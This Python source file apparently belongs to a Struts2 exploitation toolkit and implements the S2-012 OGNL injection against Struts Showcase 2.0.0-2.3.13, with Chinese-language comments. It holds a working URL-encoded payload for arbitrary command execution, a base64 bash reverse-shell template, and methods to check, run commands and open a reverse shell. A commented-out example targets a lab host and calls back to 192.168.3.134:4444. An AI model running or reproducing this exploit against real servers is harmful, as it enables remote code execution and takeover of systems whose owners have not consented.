import urllib.parse
from exploit import tools

class S2_012:
    """S2-012漏洞检测利用类"""
    info = "[+] S2-012:影响版本Struts Showcase App 2.0.0-2.3.13; POST请求发送数据,默认参数为:name; 支持任意命令执行和反弹Linux shell"
    exec_payload = "%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B{cmd}%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D"

    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        if "?" in url:
            self.url = url.split("?")[0].strip()
        else:
            self.url = url
        if not data:
            self.data = "name={exp}"
        else:
            self.data = data
        self.headers = tools.parser_headers(headers)
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = "application/x-www-form-urlencoded"
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        html = tools.echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-012'
        return self.is_vul

    def exec_cmd(self, cmd):
        """执行命令"""
        cmd = tools.parser_cmd(cmd)
        data = self.data.format(exp=self.exec_payload.format(cmd=urllib.parse.quote(cmd)))
        html = tools.post(self.url, data=data, headers=self.headers, encoding=self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = tools.reverse_shell(self, ip, port)
        return html
#
# if __name__ == '__main__':
#     s = S2_012("http://192.168.217.138:8080/S2-012/user.action")
#     tools._proxies = {
#         "http":"127.0.0.1:8080",
#         "https":"127.0.0.1:8080"
#     }
#     print(s.check())
#     print(s.exec_cmd('ls -la'))
#     s.reverse_shell('192.168.3.134', '4444')